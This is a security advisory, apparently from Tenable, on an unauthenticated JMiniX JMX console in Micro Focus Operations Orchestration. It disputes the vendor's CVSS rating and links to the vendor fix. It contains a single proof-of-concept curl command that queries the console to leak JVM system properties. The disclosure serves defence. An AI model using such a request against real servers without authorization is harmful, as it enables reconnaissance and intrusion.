# [R1] Micro Focus Operations Orchestrations Information Disclosure and Remote Denial of Service

High

[← View More Research Advisories](/security/research)
### Synopsis

The default configuration of Operations Orchestration exposes the [JMiniX](https://github.com/lbovet/jminix)  JMX console to unauthenticated remote users. A malicious attacker can use this console to gather information:

```

albinolobster@ubuntu:~$ curl -d "executed=true" -X POST http://192.168.1.253:8080/oo/jminix/servers/0/domains/com.sun.management/mbeans/type=DiagnosticCommand/operations/vmSystemProperties%28%29/

```

A note on the CVSS scoring. Micro Focus has given this a score using “AC:H” (or Access Complexity: High). The description for a “Low” access complexity follows:

```

Specialized access conditions or extenuating circumstances do not exist. The following are examples:
- The affected product typically requires access to a wide range of systems and users, possibly anonymous and untrusted (e.g., Internet-facing web or mail server).
- The affected configuration is default or ubiquitous.
- The attack can be performed manually and requires little skill or additional information gathering.
- The race condition is a lazy one (i.e., it is technically a race but easily winnable).

```
The affected configuration is the default configuration. Tenable’s CVSS scoring reflects that while Micro Focus’ does not.

### Solution

Follow the vendor's instructions found [here](https://softwaresupport.softwaregrp.com/document/-/facetsearch/document/KM03103896).
